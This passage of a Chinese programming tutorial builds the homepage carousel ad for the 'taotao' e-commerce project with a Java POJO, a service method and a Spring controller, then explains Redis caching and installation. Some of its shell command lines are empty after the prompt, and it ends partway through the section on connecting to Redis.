&lt;p&gt;分析:&lt;br/&gt;  taotao-portal-web 需要自己自定义的POJO的类型数据的列表。&lt;br/&gt;  taotao-content 是服务层公用的，可以被其他的系统（表现层的系统）来调用。&lt;br/&gt;  为了通用性：taotao-content 服务层中获取tb_content的内容列表 即：&lt;code&gt;list&amp;lt;TbContent&amp;gt;&lt;/code&gt;&lt;br/&gt;  taotao-portal-web 表现层需要拿到tb_content的列表，然后进行转换成自定义的类型的数据列表即可。&lt;br/&gt;  从tb_content表中取数据，根据(叶子节点)内容分类id查询列表(内容列表)。&lt;br/&gt;  &lt;code&gt;内容分类id固定，需要配置在属性文件中&lt;/code&gt;。&lt;br/&gt;  &lt;code&gt;图片的width、height配置在属性文件中&lt;/code&gt;。&lt;br/&gt;  alt属性从字段sub_title中获取。&lt;br/&gt;  src --&amp;gt; pic&lt;br/&gt;  srcB --&amp;gt; pic2&lt;br/&gt;  href --&amp;gt; url&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;URL:/index&lt;br/&gt;参数：无。&lt;br/&gt;返回值:首页页面(数据是JSON，设置在Model中)&lt;/p&gt;
&lt;p&gt;业务逻辑：&lt;br/&gt;  1、根据分类的id 查询内容列表&lt;code&gt;(List&amp;lt;TbContent&amp;gt;)&lt;/code&gt;&lt;br/&gt;  2、服务层发布服务。&lt;br/&gt;  3、表现层引入服务。&lt;br/&gt;  4、调用服务，转换成自定义的数据类型&lt;code&gt;(Ad1Node)&lt;/code&gt;的列表。&lt;br/&gt;  5、将数据列表设置到&lt;code&gt;Model&lt;/code&gt;中，返回给页面。&lt;/p&gt;
&lt;p&gt;需要创建一个pojo转换成页面需要的json数据格式。放入taotao-portal-web工程的com.taotao.portal.pojo中。&lt;br/&gt;AD1Node.java&lt;/p&gt;
&lt;pre readability=&quot;27&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;48&quot;&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;AD1Node&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Serializable&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;long&lt;/span&gt; serialVersionUID = &lt;span class=&quot;hljs-number&quot;&gt;1L&lt;/span&gt;;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String srcB;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer height;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String alt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer width;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String src;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer widthB;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; String href;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer heightB;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getSrcB&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; srcB;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setSrcB&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String srcB)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.srcB = srcB;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; Integer &lt;span class=&quot;hljs-title&quot;&gt;getHeight&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; height;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setHeight&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Integer height)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.height = height;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getAlt&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; alt;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setAlt&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String alt)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.alt = alt;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; Integer &lt;span class=&quot;hljs-title&quot;&gt;getWidth&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; width;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setWidth&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Integer width)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.width = width;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getSrc&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; src;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setSrc&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String src)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.src = src;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; Integer &lt;span class=&quot;hljs-title&quot;&gt;getWidthB&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; widthB;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setWidthB&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Integer widthB)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.widthB = widthB;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;getHref&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; href;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setHref&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String href)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.href = href;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; Integer &lt;span class=&quot;hljs-title&quot;&gt;getHeightB&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; heightB;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;setHeightB&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Integer heightB)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.heightB = heightB;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;AD1Node [srcB=&quot;&lt;/span&gt; + srcB + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, height=&quot;&lt;/span&gt; + height + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, alt=&quot;&lt;/span&gt; + alt + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, width=&quot;&lt;/span&gt; + width + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, src=&quot;&lt;/span&gt; + src&lt;br/&gt;+ &lt;span class=&quot;hljs-string&quot;&gt;&quot;, widthB=&quot;&lt;/span&gt; + widthB + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, href=&quot;&lt;/span&gt; + href + &lt;span class=&quot;hljs-string&quot;&gt;&quot;, heightB=&quot;&lt;/span&gt; + heightB + &lt;span class=&quot;hljs-string&quot;&gt;&quot;]&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h12dao&quot;&gt;&lt;span&gt;&lt;strong&gt;1.2、Dao层&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;从tb_content表中取出数据，根据内容分类id查询内容列表。可以使用逆向工程生成的Mapper。&lt;/p&gt;
&lt;h3 id=&quot;h13service&quot;&gt;&lt;span&gt;&lt;strong&gt;1.3、Service层&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;参数：Long categoryId&lt;br/&gt;返回值：&lt;code&gt;List&amp;lt;TbContent&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs php&quot;&gt;    @Override&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;List&lt;/span&gt;&amp;lt;TbContent&amp;gt; getContentListByCategoryId(Long categoryId) {&lt;br/&gt;TbContentExample contentExample = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; TbContentExample();&lt;br/&gt;Criteria criteria = contentExample.createCriteria();&lt;br/&gt;criteria.andCategoryIdEqualTo(categoryId);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;List&lt;/span&gt;&amp;lt;TbContent&amp;gt; &lt;span class=&quot;hljs-keyword&quot;&gt;list&lt;/span&gt; = contentMapper.selectByExample(contentExample);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;list&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;h131&quot;&gt;&lt;span&gt;&lt;strong&gt;1.3.1、发布服务&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;在taotao-content-service工程applicationContext-service.xml中发布服务&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSQgn.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h14&quot;&gt;&lt;span&gt;&lt;strong&gt;1.4、表现层&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;在taotao-portal-web中实现，查询首页轮播图的内容。&lt;/p&gt;
&lt;h4 id=&quot;h141&quot;&gt;&lt;span&gt;&lt;strong&gt;1.4.1、引用服务&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;先在taotao-protal-web项目中引入对taotao-content-interface的依赖，如图：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSjcQ.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;在taotao-content-web工程springmvc.xml中引入服务&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zS0UG.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h142controller&quot;&gt;&lt;span&gt;&lt;strong&gt;1.4.2、Controller&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;在首页展示之前，对数据进行处理，然后展示首页，需要在IndexController中实现。&lt;/p&gt;
&lt;pre readability=&quot;12&quot;&gt;
&lt;code class=&quot;hljs kotlin&quot; readability=&quot;18&quot;&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Controller&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;IndexController&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Autowired&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; ContentService contentService;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Value(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;&lt;span class=&quot;hljs-subst&quot;&gt;${AD1_CATEGORY_ID}&lt;/span&gt;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; AD1_CATEGORY_ID;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Value(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;&lt;span class=&quot;hljs-subst&quot;&gt;${AD1_HEIGHT}&lt;/span&gt;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer AD1_HEIGHT;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Value(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;&lt;span class=&quot;hljs-subst&quot;&gt;${AD1_HEIGHT_B}&lt;/span&gt;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer AD1_HEIGHT_B;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Value(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;&lt;span class=&quot;hljs-subst&quot;&gt;${AD1_WIDTH}&lt;/span&gt;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer AD1_WIDTH;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Value(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;&lt;span class=&quot;hljs-subst&quot;&gt;${AD1_WIDTH_B}&lt;/span&gt;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; Integer AD1_WIDTH_B;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;/index&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String showIndex(Model model) {&lt;br/&gt;List&amp;lt;TbContent&amp;gt; contentList = contentService.getContentListByCategoryId(AD1_CATEGORY_ID);&lt;br/&gt;List&amp;lt;AD1Node&amp;gt; aD1NodeList = new ArrayList&amp;lt;&amp;gt;();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (TbContent tbContent : contentList) {&lt;br/&gt;AD1Node aD1Node = new AD1Node();&lt;br/&gt;aD1Node.setAlt(tbContent.getSubTitle());&lt;br/&gt;aD1Node.setHref(tbContent.getUrl());&lt;br/&gt;aD1Node.setSrc(tbContent.getPic());&lt;br/&gt;aD1Node.setSrcB(tbContent.getPic2());&lt;br/&gt;aD1Node.setHeight(AD1_HEIGHT);&lt;br/&gt;aD1Node.setHeightB(AD1_HEIGHT_B);&lt;br/&gt;aD1Node.setWidth(AD1_WIDTH);&lt;br/&gt;aD1Node.setWidthB(AD1_WIDTH_B);&lt;br/&gt;aD1NodeList.add(aD1Node);&lt;br/&gt;}&lt;br/&gt;String json = JsonUtils.objectToJson(aD1NodeList);&lt;br/&gt;model.addAttribute(&lt;span class=&quot;hljs-string&quot;&gt;&quot;ad1&quot;&lt;/span&gt;, json);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;index&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;属性文件所在位置：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSdQE.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;在taotao-portal-web中的springmvc.xml中还需要配置：
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;context:property-placeholder&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;location&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;classpath:resource/resource.properties&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h15&quot;&gt;&lt;span&gt;&lt;strong&gt;1.5、测试&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;后台数据如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSGf2.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;前台浏览器显示界面：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSJUN.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;其他广告位同理。
&lt;h2 id=&quot;h2&quot;&gt;&lt;span&gt;&lt;strong&gt;2、首页大广告展示流程图&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/11/19/5zSOXa.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;  首页是&lt;code&gt;系统的门户&lt;/code&gt;，也就是&lt;code&gt;系统的入口&lt;/code&gt;。所以首页的访问量是这个系统最大的。如果每次展示首页都从数据库中查询首页的内容信息，那么势必会对数据库造成很大的压力，所以需要使用缓存来减轻数据库压力。&lt;br/&gt;  实现缓存的工具有很多，现在比较流行的是redis。&lt;br/&gt;  首页大广告展示流程：&lt;br/&gt;  展示流程：先从缓存取，如果不存在，从数据库取出来，写入缓存，再返回页面；如果存在key，直接从缓存中取出来，展示到页面。&lt;br/&gt;  同步缓存：当事务提交（更新，删除，插入）后，需要同步缓存，直接根据Key删除redis的key（清空缓存），再展示时 由上边的流程展示。&lt;/p&gt;
&lt;h2 id=&quot;h3redis&quot;&gt;&lt;span&gt;&lt;strong&gt;3、Redis的安装及使用&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h31redis&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1、redis的下载&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;  官网地址：http://redis.io/&lt;br/&gt;  下载地址：http://download.redis.io/releases/redis-3.0.0.tar.gz&lt;/p&gt;
&lt;h3 id=&quot;h32redis&quot;&gt;&lt;span&gt;&lt;strong&gt;3.2、redis的安装&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;  安装redis需要c语言的编译环境，如果没有gcc需要在线安装。如下命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs coffeescript&quot;&gt;[root@itheima ~]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;  检测是否有gcc环境，只需输入命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs coffeescript&quot;&gt;[root@itheima ~]&lt;br/&gt;[root@itheima ~]&lt;br/&gt;gcc: 致命错误：没有输入文件&lt;br/&gt;编译中断。&lt;br/&gt;[root@itheima ~]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;出现如上所述内容，表示gcc安装成功。&lt;br/&gt;安装步骤：&lt;br/&gt;  第一步：将redis的源码包上传到linux系统。&lt;br/&gt;  第二步：解压缩redis的源码包。&lt;br/&gt;  第三步：进行编译。cd到解压后的目录，输入命令：make&lt;br/&gt;  第四步：进行安装。输入命令：make install PREFIX=/usr/local/redis&lt;br/&gt;  第五步：检查目录是否存在。在/usr/local/redis下有bin目录，则说明安装成功。&lt;/p&gt;
&lt;h3 id=&quot;h33redis&quot;&gt;&lt;span&gt;&lt;strong&gt;3.3、连接redis&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h331redis&quot;&gt;&lt;span&gt;&lt;strong&gt;3.3.1、redis的启动&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;前端启动：在redis的安装目录下直接启动redis-server&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs coffeescript&quot;&gt;[root@itheima ~]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;后台启动：&lt;br/&gt;把/root/redis-3.0.0/redis.conf复制到/usr/local/redis/bin目录下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs coffeescript&quot;&gt;[root@itheima redis&lt;span class=&quot;hljs-number&quot;&gt;-3.0&lt;/span&gt;&lt;span class=&quot;hljs-number&quot;&gt;.0&lt;/span&gt;]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;修改配置文件：&lt;code&gt;将daemonize由no改为yes&lt;/code&gt;&lt;br/&gt;再次启动redis：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs coffeescript&quot;&gt;[root@itheima bin]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查看redis进程：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs perl&quot;&gt;[root@itheima bin]&lt;br/&gt;root       &lt;span class=&quot;hljs-number&quot;&gt;5845&lt;/span&gt;  &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;  &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;140888&lt;/span&gt;  &lt;span class=&quot;hljs-number&quot;&gt;2104&lt;/span&gt; ?        Ssl  &lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;51&lt;/span&gt;   &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; ./redis-server *:&lt;span class=&quot;hljs-number&quot;&gt;6379&lt;/span&gt;&lt;br/&gt;root       &lt;span class=&quot;hljs-number&quot;&gt;5858&lt;/span&gt;  &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;112720&lt;/span&gt;   &lt;span class=&quot;hljs-number&quot;&gt;980&lt;/span&gt; pts/&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;    R+   &lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;51&lt;/span&gt;   &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;grep&lt;/span&gt; --color=auto redis&lt;br/&gt;[root@itheima bin]&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;前端启动，不能更换终端，影响下一步操作。而后台启动，只在进程中悄悄启动。推荐使用后台启动。&lt;/p&gt;
&lt;h4 id=&quot;h332rediscliredis&quot;&gt;&lt;span&gt;&lt;strong&gt;3.3.2、客户端redis-cli连接redis&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;使用redis-cli建立连接：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs ruby&quot;&gt;[root@itheima bin]&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; ping&lt;br/&gt;PONG&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;127.0.0.1:6379&amp;gt;&lt;/span&gt; &lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;默认连接localhost运行在6379端口的redis服务。&lt;br/&gt;连接其他ip和端口：&lt;/p&gt;
&lt;pre&gt;
